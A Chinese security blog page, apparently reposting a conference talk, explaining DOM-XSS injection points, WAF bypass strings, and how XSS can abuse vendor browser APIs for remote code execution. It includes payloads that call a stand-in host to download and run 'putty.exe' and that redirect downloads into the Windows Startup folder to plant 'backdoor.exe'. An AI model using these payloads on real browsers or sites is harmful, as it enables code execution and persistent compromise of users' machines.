@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="DOM-XSS 常见位置URL代入页面这类DOM-XSS是最常见的，它的漏洞点通常是以下形式出现。 1234567function getUrlParam(name) &amp;#123;    var reg = new RegExp(&quot;(^|&amp;amp;)&quot; + name + &quot;=([^&amp;amp;]*)(&amp;amp;|$)&quot;);    var r = window.location.href.substr">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dom xss">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/01/2018-12-01-dom xss/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="DOM-XSS 常见位置URL代入页面这类DOM-XSS是最常见的，它的漏洞点通常是以下形式出现。 1234567function getUrlParam(name) &amp;#123;    var reg = new RegExp(&quot;(^|&amp;amp;)&quot; + name + &quot;=([^&amp;amp;]*)(&amp;amp;|$)&quot;);    var r = window.location.href.substr">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://cstcamaro.github.io/screenshots/1.png">
+<meta property="og:image" content="https://cstcamaro.github.io/screenshots/2.png">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.187Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dom xss">
+<meta name="twitter:description" content="DOM-XSS 常见位置URL代入页面这类DOM-XSS是最常见的，它的漏洞点通常是以下形式出现。 1234567function getUrlParam(name) &amp;#123;    var reg = new RegExp(&quot;(^|&amp;amp;)&quot; + name + &quot;=([^&amp;amp;]*)(&amp;amp;|$)&quot;);    var r = window.location.href.substr">
+<meta name="twitter:image" content="https://cstcamaro.github.io/screenshots/1.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/01/2018-12-01-dom xss/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Dom xss | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/01/2018-12-01-dom xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Dom xss
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-01T00:00:00+08:00">2018-12-01</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">5.1k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h2 id="DOM-XSS-常见位置"><a href="#DOM-XSS-常见位置" class="headerlink" title="DOM-XSS 常见位置"></a>DOM-XSS 常见位置</h2><h3 id="URL代入页面"><a href="#URL代入页面" class="headerlink" title="URL代入页面"></a>URL代入页面</h3><p>这类DOM-XSS是最常见的，它的漏洞点通常是以下形式出现。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlParam</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|&amp;)"</span> + name + <span class="string">"=([^&amp;]*)(&amp;|$)"</span>);</span><br><span class="line">    <span class="keyword">var</span> r = <span class="built_in">window</span>.location.href.substr(<span class="number">1</span>).match(reg);</span><br><span class="line">    <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>]); <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'foo'</span>).innerHTML = getUrlParam(<span class="string">'foo'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>它出现的地方比较多，可能会是名称，地点，标题等等。</p>
+<p>大多数情况下它和反射型XSS的区别不大，最大的区别是取的值不同。</p>
+<p>来看代码中的第二行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(reg);</span><br></pre></td></tr></table></figure>
+
+<p>此时取值时，匹配的URL是<code>location.href</code>，这个值包含了 <code>location.search</code> 和 <code>location.hash</code> 的值，而 <code>location.hash</code> 的值是不被传到服务器，并且能被前端JS通过 <code>getUrlParam</code> 函数成功取值。</p>
+<h3 id="跳转类"><a href="#跳转类" class="headerlink" title="跳转类"></a>跳转类</h3><p>在 <code>javascript</code> 语法中，使用如下代码可以将页面进行跳转操作</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = urlparams.redirecturl;</span><br></pre></td></tr></table></figure>
+
+<p>这样的跳转通常会出现在登录页、退出页、中间页。</p>
+<p>如果开发者让用户可以控制 <code>redirecturl</code> 参数，就可以使用 <code>javascript:alert(1)</code> 的形式进行XSS攻击。</p>
+<p>最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 <code>webview://</code> , <code>myappbridge://</code> 等等。 仅仅使用 <code>http</code> 和 <code>https</code> 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。</p>
+<h3 id="缓存类"><a href="#缓存类" class="headerlink" title="缓存类"></a>缓存类</h3><p>开发者在缓存前端数据的时候，通常会存在 <code>sessionStorage</code> , <code>localStorage</code> , <code>cookie</code> 中，因为 <code>sessionStorage</code> 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="built_in">document</span>.cookie.match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|; )"</span> + name + <span class="string">"=([^;]*)(;|$)"</span>));</span><br><span class="line">    <span class="keyword">if</span> (arr != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据浏览器的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">同源策略</a>，Cookie是可以被子域名读到的。 一旦我们发现在 <code>http://example.com/setCookie.php?key=username&amp;value=password</code> 下可以设置Cookie,就可以结合一些读取Cookie的页面进行XSS攻击。</p>
+<p><code>localStorage</code> 的特性和Cookie类似，但它和Cookie不同的是，Cookie被设置过之后，具有有效期这个特性，而localStorage被设置过后，只要不手动清除或覆盖，这个值永远不会消失。 Cookie中通常会存放少量的缓存信息，像用户的头像URL，用户名等等，而localStorage中通常会存放一些大量，需要重复加载的数据，如搜索历史记录，缓存JS代码等等。</p>
+<p>这些值被修改过以后，大部分开发者都不会去校验它的合法性，是否被修改过。</p>
+<h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p><code>postMessage</code> 可以跨域使用，使用场景比较广泛，如支付成功的回调页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;message&quot;, function (e) &#123;</span><br><span class="line">    eval(e.data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这段代码中，监听了message事件，取了 <code>e.data</code> 的值，也就是来自于其他页面上的message消息，但是没有检测来源。如果页面允许被嵌套，即可嵌套该页面，再使用 <code>window[0].postMessage</code> 即可向该窗口发送数据。</p>
+<h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p><code>window.name</code> 与其他 <code>window</code> 对象不同，它在窗口刷新后会保留。 例如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"example.com"</span> name=<span class="string">"Foo"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>当这个页面刷新跳转到其他网站时，如果这个网站没有对 <code>window.name</code> 进行设置，那么当前<code>window.name</code>的值仍然是<code>Foo</code></p>
+<h2 id="DOM-XSS-优势在哪"><a href="#DOM-XSS-优势在哪" class="headerlink" title="DOM-XSS 优势在哪"></a>DOM-XSS 优势在哪</h2><p>通过以上简单的介绍，大家对DOM-XSS有了一定的了解，接下来我们继续讲一讲，相比较其他类型的XSS，DOM-XSS它的优势在哪？</p>
+<h3 id="避开WAF"><a href="#避开WAF" class="headerlink" title="避开WAF"></a>避开WAF</h3><p>正如我们开头讲的第一种DOM-XSS，可以通过 <code>location.hash</code> 的方式，将参数写在 <code>#</code> 号后，既能让JS读取到该参数，又不让该参数传入到服务器，从而避免了WAF的检测。</p>
+<p>我们可以使用 <code>ja%0avasc%0aript:alert(1)</code> , <code>j\x61vascript:alert(1)</code> 的形式绕过</p>
+<p>可以利用 <code>postMessage</code>,<code>window.name</code>,<code>localStorage</code> 等攻击点进行XSS攻击的，攻击代码不会经过WAF。</p>
+<h3 id="长度不限"><a href="#长度不限" class="headerlink" title="长度不限"></a>长度不限</h3><p>当我们可以用当前页面的变量名作为参数时，可以使用 <code>&lt;iframe src=&quot;http://example.com/?poc=name&quot;&gt;</code> 的方式进行攻击。</p>
+<h3 id="隐蔽性强"><a href="#隐蔽性强" class="headerlink" title="隐蔽性强"></a>隐蔽性强</h3><p>攻击代码可以具有隐蔽性，持久性。例如使用Cookie和localStorage作为攻击点的DOM-XSS，非常难以察觉，且持续的时间长。</p>
+<h2 id="XSS-巧妙利用"><a href="#XSS-巧妙利用" class="headerlink" title="XSS 巧妙利用"></a>XSS 巧妙利用</h2><p>我们熟知的XSS利用方式有窃取Cookie，钓鱼页面，盲打后台地址。如果你对这个网站的框架比较熟悉的话，甚至可以让管理员上传一个WebShell。</p>
+<p>接下来我们要分享的是，如何通过XSS来实现客户端RCE。</p>
+<p>我们知道，chromium支持开发者扩展api。厂商在开发浏览器的时候，或是为了自己的业务需求，或是出于用户体验，会给浏览器扩展上一些自己的接口，这些接口比较隐蔽，且只接口来自于信任域名的数据。 但是如果我们有一个特殊域名下的XSS，或者这个特殊域名可以被跨域，我们甚至可以找任意一个当前域名的XSS对它进行攻击。</p>
+<p>通过以下代码就可以对当前页面下的 <code>chrome</code> 对象进行遍历。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = chrome;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> p) &#123;</span><br><span class="line">  <span class="keyword">if</span> (p.hasOwnProperty(key) &amp;&amp; p[key] == <span class="string">"[object Object]"</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key + <span class="string">" -&gt; "</span> + p[key]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由遍历的结果可以看出，除了默认的 <code>app</code>,<code>webstore</code> 之外，还有一些特殊的 <code>[object Object]</code> 对象。再结合厂商的名字，就可以猜测出这个接口是做什么用的。</p>
+<p>有一款浏览器，它的接口特别丰富，现在给大家分享以下之前的调试过程。</p>
+<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>首先从业务入手，找到了一个叫做<code>game.html</code>的页面，我们观察到页面上大部分是游戏，使用了上面的代码对<code>chrome</code>对象进行遍历之后，发现了<code>browser_game_api</code>的对象，这个继续遍历这个api，看它有哪些变量、函数和对象。</p>
+<p>这时候我们发现了一个函数叫做 <code>downloadAndRun</code> ，从函数名来看，这个函数执行的操作是比较危险的。那么这些函数的参数是什么的，我们不知道，就需要从这个特殊域名下面的页面中去找。 根据函数名搜索，很快就找到了这个函数调用的地方。于是构造攻击代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browser_game_api.downloadAndRun(&#123;<span class="string">'url'</span>: <span class="string">'https://hacker.com/putty.exe'</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>又因为这个站点将自己的 <code>domain</code> 设置成了 <code>example.com</code> ，于是我们可以通过其他 <code>exmaple.com</code> 下的XSS来调用它页面下的接口。</p>
+<p>首先发现了 <code>https://exmaple.com/</code> 下的一个XSS，利用XSS将当前页面的 <code>document.domain</code> 设置为 <code>example.com</code> ，这样它就和 <code>game.html</code> 同域了。</p>
+<p>接下来在XSS页面执行以下代码，即可在新的窗口弹出 <code>putty.exe</code> 。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain=<span class="string">"exmaple.com"</span> <span class="comment">// 确保当前域和打开的域是同域</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>.open(<span class="string">"https://exmaple.com/"</span>)</span><br><span class="line">a.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">a.browser_game_api.downloadAndRun(&#123;<span class="string">'url'</span>: <span class="string">'https://hacker.com/putty.exe'</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cstcamaro.github.io/screenshots/1.png" alt="browser_rce"></p>
+<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>继续遍历Api，我们又发现了一个特殊的接口，用于设置用户的偏好，其中就包含设置下载目录和设置静默下载。</p>
+<p>于是我们想到了另一种攻击方式，就是通过调用它自带的设置偏好接口，将用户的下载目录设置为window的启动目录 <code>C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code></p>
+<p>同样的，找到一个 <code>exmaple.com</code> 下的XSS，将自身的 <code>domain</code> 设置成 <code>exmaple.com</code> ，再使用 <code>window.opener</code> 的方式，调用特殊权限页面的接口进行攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">browser.setDownloadPath(</span><br><span class="line">    &#123;</span><br><span class="line">    &apos;path&apos;:&apos;C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&apos;</span><br><span class="line">    &#125;);</span><br><span class="line">location.href=&quot;http://www.example.com/backdoor.exe&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cstcamaro.github.io/screenshots/2.png" alt="browser_rce"></p>
+<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><p>说完了针对windows的漏洞，再和大家一起分享一个安卓上的XSS利用技巧。</p>
+<p>早在2014年12月12日，Rapid7报告了一个漏洞。利用浏览器的UXSS实现在 Android 4.3 或更低版本的系统上安装任意APP。 这个漏洞利用了三点：</p>
+<ul>
+<li>第一点使用了UXSS作为攻击手段，在 <code>play.google.com</code> 下调用安装APP的代码</li>
+<li>第二点利用了 <code>play.google.com</code> 的可被嵌套的缺陷。我们知道在Android上是没有 <code>window.opener</code> 这个属性的，不能通过 <code>window.open</code> 一个窗口再调用它的函数。还有一种利用的方式是通过 <code>iframe</code> 对它进行调用。</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"poc.html"</span> name=<span class="string">"foo&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">window.foo.func()</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第三点，<code>play.google.com</code> 的安装机制，是在用户登录了浏览器之后就可以唤起 Google Play 进行安装。</li>
+</ul>
+<p>结合这三点，就完全满足了XSS利用的条件。</p>
+<p>来看一下完整的攻击流程</p>
+<p>首先攻击者注册成为Google开发者，在应用市场上发布了一款叫做 <code>backdoor_app</code> 的应用。</p>
+<p>接着将play.google.com嵌套至攻击页面中，利用UXSS调用安装代码。</p>
+<p>谷歌市场启动，在后台进行安装应用。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>随着浏览器的使用范围越来越广，我们相信无论是反射型、存储型还是DOM-XSS，都是不容小觑的。</p>
+<p>作为开发者，我们要防御的不仅仅是来自于（任何输入点），有些时候，来源于自己的站点的数据也要加入防御列表。</p>
+<p>我的分享到此结束，谢谢大家。</p>
+<p><a href="https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">ISC-演讲稿</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/01/2018-12-01-dom xss/" title="Dom xss">https://wh0ale.github.io/2018/12/01/2018-12-01-dom xss/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i># xss</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/01/2018-12-01-Github持续学习/" rel="next" title="Github学习">
+                <i class="fa fa-chevron-left"></i> Github学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/01/2018-12-01-白盒测试/" rel="prev" title="白盒测试">
+                白盒测试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
